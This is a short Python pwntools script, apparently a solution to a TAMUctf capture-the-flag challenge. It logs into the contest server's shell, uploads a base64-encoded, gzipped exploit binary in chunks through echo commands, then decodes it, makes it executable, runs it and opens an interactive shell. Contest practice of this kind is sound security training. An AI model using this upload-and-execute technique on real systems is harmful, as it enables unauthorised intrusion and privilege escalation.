from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="shmeeky")

p.sendlineafter(b'login: ', b'pwn')
p.sendlineafter(b'$ ', b'cd /tmp')

binary = ''
progress = 0
n = 0x300
with open('./exploit.gz.b64', 'r') as f:
    binary = f.read()

for s in [binary[i: i+n] for i in range(0, len(binary), n)]:
    p.sendlineafter(b'$ ', 'echo -n "{}" >> exploit.gz.b64'.format(s))
    progress += n
    if progress % n == 0:
        print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))

print(p.recvuntil(b'$ '))
p.sendline(b'base64 -d exploit.gz.b64 > exploit.gz')
print(p.recvuntil(b'$ '))
p.sendline(b'gunzip ./exploit.gz')
print(p.recvuntil(b'$ '))
p.sendline(b'chmod +x ./exploit')
print(p.recvuntil(b'$ '))
p.sendline(b'./exploit')
print(p.recvuntil(b'$ '))
p.interactive()
